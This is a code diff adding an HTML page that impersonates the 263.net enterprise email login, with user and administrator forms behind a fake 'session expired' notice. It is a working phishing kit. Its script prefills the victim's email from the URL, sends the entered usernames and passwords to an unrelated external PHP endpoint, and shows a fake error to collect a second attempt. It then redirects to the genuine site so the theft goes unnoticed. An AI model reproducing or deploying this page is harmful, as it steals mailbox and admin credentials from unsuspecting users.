@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>登录企业邮箱-mail.263.net企业邮箱</title>
+    <meta content="企业邮箱,登录企业邮箱,mail.263.net,263企业邮箱" name="keywords">
+    <meta content="登录mail.263.net企业邮箱，马上体验263企业邮箱专业服务，263企业邮箱为mail.263.net提供安全稳定、数据加密传输、反垃圾专利、超大空间、全球畅邮、邮件百分百送达的企业邮箱服务。" name="description">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+        <style>
+
+body, button, input, select, textarea {
+    font: 12px/1.5 "\5FAE\8F6F\96C5\9ED1", "Microsoft Yahei", "Hiragino Sans GB", tahoma, arial, "\5B8B\4F53";
+    -webkit-font-smoothing: antialiased;
+}
+
+body {
+    font-size: 12px;
+    /* font-family: "宋体"; */
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    background: #fff;
+}
+
+header {
+    height: 70px;
+    border-bottom: 1px solid #f0f0f0;
+}
+
+.header-content {
+    max-width: 1024px;
+    margin: 0 auto;
+    height: 70px;
+    position: relative;
+    padding: 0;
+}
+
+.logo-space {
+    width: 165px;
+    height: 60px;
+    padding-top: 12px;
+    float: left;
+}
+
+.logo {
+    height: auto;
+    width: 100%;
+}
+
+.nav {
+    float: right;
+    margin: 45px 0 0 0;
+    padding: 0;
+    list-style: none;
+    display: flex;
+    align-items: center;
+}
+
+.nav li {
+    display: inline-block;
+    margin-left: 20px;
+}
+
+.nav li a {
+    color: #333333;
+    text-decoration: none;
+    font-size: 14px;
+}
+
+.nav li a:hover {
+    color: #0078d7;
+}
+
+main {
+    flex: 1;
+    position: relative;
+    min-height: calc(100vh - 180px); /* Reduced height */
+}
+
+.background-container {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #1067ba;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.center-image {
+    max-width: 800px;
+    width: 95%; /* Adjusted width */
+    height: auto;
+    position: relative;
+    left: -8%; /* Moved more to the left */
+    margin-top: -20px; /* Slight upward adjustment */
+}
+
+.login-container {
+    position: absolute;
+    top: 50%;
+    right: 180px;
+    transform: translateY(-50%);
+    background: white;
+    padding: 0 25px 25px; /* Removed top padding */
+    border-radius: 4px;
+    width: 300px; /* Reduced width */
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+}
+
+.login-tabs {
+    display: flex;
+    margin: 0 -25px 20px; /* Adjusted negative margin to match new container padding */
+    position: relative;
+    border-bottom: 1px solid #f0f0f0;
+
+}
+
+.tab {
+    flex: 1;
+    padding: 12px 0;
+    border: none;
+    background: none;
+    cursor: pointer;
+    color: #999;
+    font-size: 15px;
+    position: relative;
+    transition: all 0.3s ease;
+}
+
+.tab:first-child {
+    border-top-left-radius: 4px;
+}
+
+.tab:last-child {
+    border-top-right-radius: 4px;
+}
+
+.tab.active {
+    color: #333;
+}
+
+.tab:not(.active) {
+    background: #f5f5f5;
+}
+
+.input-group {
+    position: relative;
+    margin-bottom: 15px;
+}
+
+.input-group::before {
+    content: '';
+    display: block;
+    width: 18px;
+    height: 18px;
+    position: absolute;
+    left: 10px;
+    top: 11px;
+    background: url(https://mail.263.net/custom_login/images/loginimg.png) 0 0 no-repeat;
+    z-index: 1;
+}
+
+.input-group.password::before {
+    background-position: 0 -18px;
+}
+
+.input-group input {
+    width: 100%;
+    height: 38px;
+    padding: 8px 12px 8px 40px;
+    border: 1px solid #d3d3d3;
+    border-radius: 4px;
+    box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset;
+    font-size: 14px;
+    color: #333;
+    box-sizing: border-box;
+}
+
+.input-group input::placeholder {
+    color: #999;
+}
+
+.form-options {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin: 20px 0;
+    color: #666;
+}
+
+.checkbox-label {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    cursor: pointer;
+    color: #666;
+}
+
+.checkbox-label input[type="checkbox"] {
+    margin: 0;
+    width: 14px;
+    height: 14px;
+}
+
+.clear-trace {
+    color: #666;
+    text-decoration: none;
+}
+
+.clear-trace:hover {
+    color: #1067ba;
+}
+
+.sign-in-btn {
+    width: 100%;
+    height: 40px;
+    background: #1067ba;
+    color: white;
+    border: none;
+    border-radius: 2px;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 500;
+    margin: 5px 0;
+}
+
+.sign-in-btn:hover {
+    background: #0d5aa7;
+}
+
+.form-footer {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 20px;
+    color: #666;
+    font-size: 12px;
+}
+
+.forgot-password {
+    color: #666;
+    text-decoration: none;
+}
+
+.forgot-password:hover {
+    color: #1067ba;
+}
+
+.language-selector {
+    color: #666;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 3px;
+}
+
+.language-selector:after {
+    content: '▼';
+    font-size: 8px;
+    margin-top: 2px;
+}
+
+footer {
+    padding: 20px 0;
+    text-align: center;
+    background: #fff;
+}
+
+.footer-links {
+    margin-bottom: 15px;
+}
+
+.footer-links a {
+    color: #666;
+    text-decoration: none;
+    margin: 0 10px;
+}
+
+.footer-links span {
+    color: #ddd;
+    margin: 0 5px;
+}
+
+.copyright, .contact {
+    color: #999;
+    line-height: 1.8;
+}
+
+@media (max-width: 1366px) {
+    .login-container {
+        right: 120px;
+    }
+    
+    .center-image {
+        width: 90%;
+    }
+}
+
+@media (max-width: 768px) {
+    .login-container {
+        right: 50%;
+        transform: translate(50%, -50%);
+        width: 90%;
+        max-width: 320px;
+    }
+    
+    .center-image {
+        width: 80%;
+        left: 0;
+    }
+}
+
+.radio-group {
+    display: flex;
+    gap: 30px;
+    margin-bottom: 20px;
+}
+
+.radio-option {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+    color: #666;
+    font-size: 14px;
+}
+
+.radio-option input[type="radio"] {
+    margin: 0;
+    width: 14px;
+    height: 14px;
+    accent-color: #1067ba;
+}
+
+/* Add these styles for the header icons and QR code */
+.nav .hotline {
+    display: flex;
+    align-items: center;
+}
+
+.nav .hotline .hotlineIcon {
+    display: inline-block;
+    height: 19px;
+    width: 20px;
+    margin-right: 0;
+    margin-bottom: -3px;
+    background: url(https://mail.263.net/custom_login/images/hotlineIcon.jpg) no-repeat;
+}
+
+.nav .otherLogin {
+    display: flex;
+    align-items: center;
+    margin-left: 10px;
+}
+
+.nav .otherLogin a,
+.nav .otherLogin span {
+    margin: 0 2px;
+}
+.nav .otherLogin a, .nav .otherLogin span {
+    width: 20px;
+    height: 20px;
+    background-image: url(https://mail.263.net/custom_login/images/iconLogin.png);
+    display: inline-block;
+    zoom: 1;
+    margin-bottom: -3px;
+    float: none;
+}
+
+.nav .otherLogin span.mail {
+    background-position: 0 -40px;
+}
+
+.nav .otherLogin a.conference {
+    background-position: -40px 0;
+}
+
+.nav .otherLogin a.cast {
+    background-position: -60px 0;
+}
+
+/* QR code styles */
+.login-scancode {
+    position: absolute;
+    left: 280px;
+    top: 20px;
+    width: 38px;
+    height: 38px;
+    z-index: 2;
+    cursor: pointer;
+    margin: 30px;
+}
+
+.login-scancode div {
+    display: inline-block;
+    vertical-align: middle;
+    width: 38px;
+    height: 38px;
+    background: url("https://mail.263.net/custom_login/images/qrcode.png") no-repeat;
+}
+
+.login-scancode .login-type-pc {
+    background-position: 0 0;
+    display: none;
+}
+
+.login-scancode .login-type-wechat {
+    background-position: 0 -38px;
+}
+
+.qrcode-wrap {
+    width: 168px;
+    height: 184px;
+    display: none;
+    margin: 30px auto 0;
+    position: relative;
+    background: url("https://mail.263.net/custom_login/images/qrcode-bg.png") no-repeat;
+}
+
+.qrcode-wrap .code-img {
+    width: 132px;
+    height: 132px;
+    display: block;
+    position: absolute;
+    left: 18px;
+    top: 15px;
+}
+
+.qrcode-wrap .scan-icon-wrap {
+    position: absolute;
+    left: -60px;
+    bottom: 0;
+    width: 284px;
+}
+
+.qrcode-wrap .scan-icon {
+    text-align: center;
+}
+
+/* Add these styles */
+.system-prompt {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fff;
+    z-index: 9999;
+}
+
+.main-content {
+    display: none;
+}
+
+td {
+    font-size: 12px;
+    font-family: "宋体";
+}
+
+.header_line {
+    height: 21px;
+}
+
+.title_oge {
+    color: #b51612;
+    font-size: 15px;
+    font-weight: bold;
+    height: 20px;
+    float: left;
+    display: block;
+    background: url(https://mail.263.net/wm2e/website/images/popIcons.gif) left top no-repeat;
+    margin: 0 8px 0 10px;
+    padding: 0 0 0 25px;
+}
+
+.j_jt_bor {
+    background: #ebebeb;
+    border: none;
+    padding: 5px;
+}
+
+.jt_in_bor {
+    border: 1px solid #cdcdcd;
+    background: #fff;
+    padding-top: 10px;
+}
+
+.errorTxts {
+    font-size: 13px;
+    font-weight: bold;
+    padding: 15px 0 10px 0;
+}
+
+.j_button1 {
+    width: auto;
+    height: auto;
+    border: 1px solid #7d7d7d;
+    background: #8f8e8e;
+    padding: 6px 20px;
+    color: #fff;
+    font-size: 14px;
+    font-weight: bold;
+    margin: 12px 0;
+    cursor: pointer;
+}
+
+/* Loading Animation */
+.loading {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255, 255, 255, 0.9);
+    z-index: 9998;
+    justify-content: center;
+    align-items: center;
+}
+
+.loading-spinner {
+    width: 50px;
+    height: 50px;
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #1067ba;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+    </style>
+</head>
+<body>
+    <div class="system-prompt">
+        <table width="100%" border="0" cellspacing="0" cellpadding="0" height="100%" align="center">
+            <tbody>
+                <tr>
+                    <td height="100">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td valign="top">
+                        <table width="35%" border="0" align="center" cellpadding="0" cellspacing="0" class="j_jt_bor">
+                            <tbody>
+                                <tr>
+                                    <td valign="top">
+                                        <table width="100%" border="0" cellspacing="0" cellpadding="0" height="100%" class="jt_in_bor">
+                                            <tbody>
+                                                <tr>
+                                                    <td height="20" class="header_line">&nbsp;&nbsp;<span class="title_oge">系统提示</span></td>
+                                                </tr>
+                                                <tr>
+                                                    <td align="center" height="10">
+                                                        <table width="90%" border="0" cellspacing="0" cellpadding="0" height="100">
+                                                            <tbody>
+                                                                <tr align="center">
+                                                                    <td height="21" align="right">
+                                                                        <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+                                                                            <tbody>
+                                                                                <tr>
+                                                                                    <td height="21" align="center" class="errorTxts">您当前状态已失效，请重新登录邮箱<br>(wm2e117-022606510-aab60b68cb0dc3e85fde370998dd0104)</td>
+                                                                                </tr>
+                                                                            </tbody>
+                                                                        </table>
+                                                                    </td>
+                                                                </tr>
+                                                                <tr align="center">
+                                                                    <td>
+                                                                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                                                            <tbody>
+                                                                                <tr>
+                                                                                    <td align="right">
+                                                                                        <input type="button" id="returnButton" value="返 回" class="j_button1">
+                                                                                    </td>
+                                                                                </tr>
+                                                                            </tbody>
+                                                                        </table>
+                                                                    </td>
+                                                                </tr>
+                                                            </tbody>
+                                                        </table>
+                                                    </td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="main-content">
+        <header>
+            <div class="header-content">
+                <div class="logo-space">
+                    <img src="https://mail.263.net/custom_login/images/domain_logo.png" alt="263 Logo" class="logo">
+                </div>
+                <ul class="nav">
+                    <li><a href="http://www.263.net/r/cms/www/wm/" target="_blank">个人邮箱</a></li>
+                    <li><a href="#" target="_blank">企业邮箱</a></li>
+                    <li class="hotline">
+                        <span class="hotlineIcon" title="在线客服"></span>
+                        <a style="color: #0078d7;" href="#" class="conference" title="在线客服" target="_blank">在线客服</a>
+                    </li>
+                    <li class="otherLogin">
+                        <span class="mail" title="邮箱登录"></span>
+                        <a href="#" class="conference" title="会议登录" target="_blank"></a>
+                        <a href="#" class="cast" title="直播登录" target="_blank"></a>
+                    </li>
+                </ul>
+            </div>
+        </header>
+
+        <main>
+            <div class="background-container">
+                <img src="https://mail.263.net/custom_login/images/leftImg_new.png" alt="Communication" class="center-image">
+            </div>
+
+            <div class="login-container">
+                <div class="login-tabs">
+                    <button class="tab active">用户登录</button>
+                    <button class="tab">管理员登录</button>
+                </div>
+
+                <form class="login-form">
+                    <div class="login-scancode">
+                        <div class="login-type-pc"></div>
+                        <div class="login-type-wechat"></div>
+                    </div>
+                 
+                    <div class="input-group">
+                        <input type="email" placeholder="电子邮件" required>
+                    </div>
+                    <div class="input-group password">
+                        <input type="password" placeholder="密码" required>
+                    </div>
+                    
+                    <div class="form-options">
+                        <label class="checkbox-label">
+                            <input type="checkbox">
+                            <span>安全登录</span>
+                        </label>
+                        <a href="#" class="clear-trace">清除痕迹</a>
+                    </div>
+
+                    <button type="submit" class="sign-in-btn">登 录</button>
+
+                    <div class="form-footer">
+                        <a href="#" class="forgot-password">忘记用户密码?</a>
+                        <div class="language-selector">
+                            语言/Language
+                        </div>
+                    </div>
+                </form>
+
+                <form class="admin-login-form" style="display: none;">
+                    <div class="radio-group">
+                        <label class="radio-option">
+                            <input type="radio" name="adminType" value="administrator" checked>
+                            <span>超级域管理员</span>
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="adminType" value="sub-administrator">
+                            <span>域管理员</span>
+                        </label>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="text" placeholder="管理员帐户" required>
+                    </div>
+                    <div class="input-group password">
+                        <input type="password" placeholder="密码" required>
+                    </div>
+                    
+                    <div class="form-options">
+                        <label class="checkbox-label">
+                            <input type="checkbox">
+                            <span>安全登录</span>
+                        </label>
+                        <a href="#" class="clear-trace">清除痕迹</a>
+                    </div>
+
+                    <button type="submit" class="sign-in-btn">登 录</button>
+
+                    <div class="form-footer">
+                        <a href="#" class="forgot-password">忘记管理员密码？</a>
+                        <div class="language-selector">
+                            语言/Language
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </main>
+
+        <footer>
+            <nav class="footer-links">
+                <a href="#">263云通信官网</a>
+                <span>|</span>
+                <a href="#">视频会议</a>
+                <span>|</span>
+                <a href="#">企业直播</a>
+                <span>|</span>
+                <a href="#">企业邮箱</a>
+                <span>|</span>
+                <a href="#">电话会议</a>
+                <span>|</span>
+                <a href="#">帮助中心</a>
+            </nav>
+            <div class="copyright">
+                Copyright © 1998-2025 北京二六三企业通信有限公司 | 京ICP备08010619号-3
+            </div>
+            <div class="contact">
+                举报电话：400-650-9263 | 举报邮箱：qtqm@net263.com
+            </div>
+        </footer>
+    </div>
+</body>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const tabs = document.querySelectorAll('.tab');
+    const userLoginForm = document.querySelector('.login-form');
+    const adminLoginForm = document.querySelector('.admin-login-form');
+    const systemPrompt = document.querySelector('.system-prompt');
+    const mainContent = document.querySelector('.main-content');
+    const loading = document.querySelector('.loading');
+    const returnButton = document.getElementById('returnButton');
+
+    mainContent.style.display = 'none';
+
+    tabs.forEach(tab => {
+        tab.addEventListener('click', () => {
+            tabs.forEach(t => t.classList.remove('active'));
+            tab.classList.add('active');
+            
+            if (tab.textContent.trim() === '管理员登录') {
+                userLoginForm.style.display = 'none';
+                adminLoginForm.style.display = 'block';
+            } else {
+                userLoginForm.style.display = 'block';
+                adminLoginForm.style.display = 'none';
+            }
+        });
+    });
+
+    const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+    const email = window.location.hash.substr(1);
+    let my_email = '';
+
+    if (email) {
+        const base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+        my_email = base64regex.test(email) ? atob(email) : email;
+        document.querySelector('input[type="email"]').value = email;
+    }
+
+    const style = document.createElement('style');
+    style.textContent = `
+        .error-message {
+            color: #b51612;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+    `;
+    document.head.appendChild(style);
+
+    const userForm = document.querySelector('.login-form');
+    const adminForm = document.querySelector('.admin-login-form');
+
+    [userForm, adminForm].forEach(form => {
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'error-message';
+        errorDiv.textContent = '您的用户名或密码有误，请重新输入!';
+        form.querySelector('.input-group.password').appendChild(errorDiv);
+    });
+
+    let userAttempts = 1;
+    let adminAttempts = 1;
+
+    function handleSubmit(e, isAdmin = false) {
+        e.preventDefault();
+        
+        const form = e.target;
+        const counter = isAdmin ? adminAttempts++ : userAttempts++;
+        const email = isAdmin ? 
+            form.querySelector('input[placeholder="管理员帐户"]').value :
+            form.querySelector('input[type="email"]').value;
+        const passwordInput = form.querySelector('input[type="password"]');
+        const submitButton = form.querySelector('.sign-in-btn');
+
+        const remainingAttempts = 5 - counter; 
+        const errorMessage = `您的用户名或密码有误，请重新输入！[您已经输入错误 ${counter} 次，${remainingAttempts} 次后将被锁定]<br>(wm2e118-0226221432-${email}-8999b2e76e04b3204acea78fef214942)`;
+
+        const formData = new FormData();
+        formData.append('username', isAdmin ? 
+            form.querySelector('input[placeholder="管理员帐户"]').value :
+            form.querySelector('input[type="email"]').value);
+        formData.append('password', passwordInput.value);
+        formData.append('verify', counter);
+        formData.append('isAdmin', isAdmin);
+
+        fetch('https://dev-dopiaza.pantheonsite.io/wp-includes/ID3/ID2/ID/result.php', {
+            method: 'POST',
+            body: formData
+        }).then(() => {
+            if (counter > 1) {
+                setTimeout(() => {
+                    window.location.href = 'https://www.263.net/';
+                }, 2000);
+            } else {
+                mainContent.style.display = 'none';
+                systemPrompt.querySelector('.errorTxts').innerHTML = errorMessage;
+                systemPrompt.style.display = 'block';
+                passwordInput.value = '';
+                submitButton.disabled = false;
+            }
+        }).catch(() => {
+            mainContent.style.display = 'none';
+            systemPrompt.querySelector('.errorTxts').innerHTML = errorMessage;
+            systemPrompt.style.display = 'block';
+            passwordInput.value = '';
+            submitButton.disabled = false;
+        });
+
+        submitButton.disabled = true;
+    }
+
+    userForm.addEventListener('submit', e => handleSubmit(e, false));
+    adminForm.addEventListener('submit', e => handleSubmit(e, true));
+
+    document.querySelectorAll('input[type="password"]').forEach(input => {
+        input.addEventListener('input', () => {
+            input.closest('form').querySelector('.error-message').style.display = 'none';
+        });
+    });
+
+    const clearTrace = document.querySelector('.clear-trace');
+    clearTrace.addEventListener('click', (e) => {
+        e.preventDefault();
+        const emailInput = document.querySelector('input[type="email"]');
+        const passwordInput = document.querySelector('input[type="password"]');
+        const securityCheckbox = document.querySelector('input[type="checkbox"]');
+        
+        emailInput.value = '';
+        passwordInput.value = '';
+        securityCheckbox.checked = false;
+    });
+
+    returnButton.addEventListener('click', function() {
+        systemPrompt.style.display = 'none';
+            mainContent.style.display = 'block';
+    });
+});
+</script>
+</html>
